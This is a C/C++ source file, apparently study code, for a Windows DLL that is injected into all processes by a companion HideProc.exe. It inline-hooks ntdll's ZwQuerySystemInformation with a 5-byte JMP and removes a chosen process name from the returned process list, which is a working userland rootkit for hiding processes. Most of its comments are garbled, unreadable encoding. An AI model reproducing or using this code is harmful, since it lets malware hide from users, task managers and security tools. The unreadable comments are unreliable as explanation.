/********************
���� �帧
    HideProc.exe�� ��� ���μ����� dll injection(remotethread)
-> dll�� attach�Ǹ鼭 dll main��� hook_by_code ȣ��
-> 5Byte�� hooking.

    ���μ������� ZwQuery�� ȣ���ϸ�,
->hooking�� ��� NewZwQuery�� JMP
->NewZwQuery�� ����� ZwQuery�� ������ ���� unhook
->NewZwQuery ���ο��� ZwQuery ȣ��
->ZwQuery ���� �� NewZwQuery�� �����鼭 *return�� ��ȯ����*
->NewZwQuery�� return���� �����ϴ� �� ���� ���� �۾� ����
->return�ϱ� �� �ٽ� hooking�ɰ� return(�׷��� �� ������ �� �����ϱ�)

*********************/


#include "main.h"
#include <windows.h>

#define STATUS_SUCCESS (0x00000000L)



/*
The /SECTION option changes the attributes of a section.
Read Write Shared �ɼ�.
*/
#pragma comment(linker, "/SECTION:.SHARE,RWS")
/*
������ ��� ���ǿ� ��������� ����.
������ �ʱ�ȭ �� ������ .data �ȵ� ������ .bss����
���⼭ ����� ������ ���ڷ� ������ .share ���ǿ� ���� ��.
data_seg�� �̿��ϸ� dll�� �޸�(������) ������ �����ϴ�.
*/
#pragma data_seg(".SHARE")
char g_szProcName[MAX_PATH] = {0};
#pragma data_seg()

BYTE g_pOrgBytes[5] = {0};

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char szCurProc[MAX_PATH] = {0};
    char *p = NULL;

    GetModuleFileName(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if((p != NULL) && !_stricmp(p+1, "HideProc.exe"))
        return TRUE;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
                         (PROC)NewZwQuerySystemInformation);
/*
�̷������� �Լ� �̸��� �Ķ���ͷ� �ѱ�� ��,
�Լ������͸� �ѱ�� �Ŷ� �Ȱ��ٰ� ���� �ǰڴ�.
������ �Լ� �����͵� �Լ� ����Ű�� �Ŵϱ�
�Լ��� �ּҸ� �ѱ�ٰ� ���� �ɵ�.
�Լ��� ����ó�� � ������ ���� �� �Ҵ�Ǿ� �ִ� �Ŵϱ�.
*/
            break;

        case DLL_PROCESS_DETACH:
            unhook_by_code("ntdll.dll", "ZwQuerySystemInformation");
            break;
    }
    return TRUE; // succesful
}

BOOL hook_by_code(LPCTSTR szDllName, LPCTSTR szFuncName, PROC pfnNew){
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = {0xE9, 0};
    PBYTE pByte;

    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
    /*���ڷ� ������ dll�� func�� funcpointer�� ��ȯ�޴´�.
    �� ��� ntdll.dll�� ZwQuerySystemInformation����.
    typedef int (FAR WINAPI *FARPROC)();
    C���� ()�� wildcard���� ��������,
    � �Ķ���� ����Ʈ�� ������ �Լ����� ��õ��� �ʾ��� �� ����.
    � �Լ��� ���ڷ� �ѱ���Ŀ� ���� �Ķ���� ����Ʈ�� �ٸ��ϱ�.
    C++������ ()�� �Ķ���Ͱ� ���ٴ� ������ ���ǵǾ� �ִٰ� ��.
    windef.h���ϱ� extern C �Ǿ��ִ�.
    */

    //Byte ������ �ǵ���� �Ǵϱ� Byte �����ͷ� �ް�.
    pByte = (PBYTE)pfnOrg;

    if (pByte[0] == 0xE9)
        return FALSE;

    //5byte patch�� ���� ZwQuery.. �Լ� ���� 5byte�� W�Ӽ� �߰�
    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    //g_pOrgBytes�� 5byte ���
    memcpy(g_pOrgBytes, pfnOrg, 5);

    //JMP �ּ� ���
    //pfnNew�� NewZwQuery�� ����Ű�� ������
    /**JMP ��ɾ��� ���ڴ� ���� �ּ� ���� �ƴ϶�,
    ���� ��ġ ���� ����ּ�. ���� �̷��� ���ؾ��Ѵ�!!!
    New�� Org�� �����ּҴϱ�. -5�� JMP��ɾ� ��ü�� ����*/
    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
    memcpy(&pBuf[1], &dwAddress, 4);

    memcpy(pfnOrg, pBuf, 5);

    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

    return TRUE;

}

BOOL unhook_by_code(LPCTSTR szDllName, LPCTSTR szFuncName){
    FARPROC pfn;
    DWORD dwOldProtect;

    pfn = GetProcAddress(GetModuleHandle(szDllName), szFuncName);

    VirtualProtect((LPVOID)pfn, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pfn, g_pOrgBytes, 5);

    VirtualProtect((LPVOID)pfn, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength){

    NTSTATUS status;
    FARPROC pfn;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
    char szProcName[MAX_PATH] = {0};

    unhook_by_code("ntdll.dll", "ZwQuerySystemInformation");


    pfn = GetProcAddress(GetModuleHandle("ntdll.dll"),
                         "ZwQuerySystemInformation");
/*
pfn�� �̿��� ZwQuerySystemInformation�� ȣ��.
�ٷ� ZwQuery --JMP--> NewZwQuery�ϱ� ������
ZwQuery�� call�� �� stack�� �־���� �Ķ���Ͱ� �״�� �ִ�.
�׷��� �� �Ķ���͵��� NewZwQuery���� �״�� ����ǰ�,
�� �Ķ���͵��� �̿��� �ٽ� ZwQuery�� ȣ��.
�� ���μ����� ȣ���� ���� �״�� ���� ��.
*/
    status = ((PFZWQUERYSYSTEMINFORMATION)pfn)(
                    SystemInformationClass, SystemInformation,
                    SystemInformationLength, ReturnLength);

    //ZwQuery�Լ� ���н� �׳� END�� ����.
    if( status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFOMATION_END;

/**���μ����� ȣ��� �� ���ڷ� ���� SystemInformationClass ����
SystemProcessInformation �� ��쿡�� �۾��Ѵ�.
�� ZwQuery�� ȣ���� ���� �����߿� ���μ��� ����Ʈ�� ��������
ȣ�⸸ ������� �۾��� �ϴ� ��.

SystemInformationClass�� IN,
SystemInformation�� PVOID type���� INOUT�̴�.
pfn���� ZwQuery ȣ������ ��, SystemInformation��
single linked list�� ����ȴ�!
�� ���� �����ؾ���.
*/

    if( SystemInformationClass == SystemProcessInformation){
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while(1){
        /*multibyte�� ��� 1byte ��� 2byte ANSI
        widechar�� ��� 2����Ʈ UNICODE(UTF-16)
        CP_ACP�� system �⺻ code page(ANSI)��
        conversion�� �̿��ϰڴٴ� �ɼ�
        code page�� ���ڿ� �����Ǵ� ���� ���� table�̴�.
        UTF�� ANSI������ code page��.
        pCur->Reserved2[1]�� input,
        szProcName�� output�̴�.
        */
            WideCharToMultiByte(CP_ACP, 0,
                        (PWSTR)pCur->Reserved2[1], -1,
                        szProcName, MAX_PATH, NULL, NULL);
        /*
        g_szProcName�� ���� ���μ���
        szProcName�� ���Ḯ��Ʈ���� ���� ���μ���
        pCur = pCur + pCur->NextEntryOffset
         ���� �������� �ϳ��� �о����.
        */

            if(!_strcmpi(szProcName, g_szProcName)){
                /**
                ���������� hide�ϴ� �κ��� ����.
                ���� ���μ����� ����Ʈ�� �������� ���� ��찡 if
                else�� �߰��� �������.
                Offset�� ������ list���� �ǳʶٵ��� �����.
                */
                if(pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
            }
            else
                pPrev = pCur;//�����ʹϱ� list�� ���� ����.

            if(pCur->NextEntryOffset == 0)
                break;

            pCur = (PSYSTEM_PROCESS_INFORMATION)
            ((ULONG)pCur + pCur->NextEntryOffset);
        }

    }

    //�Ҹ��ڰ������ε�.
__NTQUERYSYSTEMINFOMATION_END:

     hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
                     (PROC)NewZwQuerySystemInformation);

     return status;
}

void DLL_EXPORT SetProcName(LPCTSTR szProcName){
    strcpy_s(g_szProcName, szProcName);
}
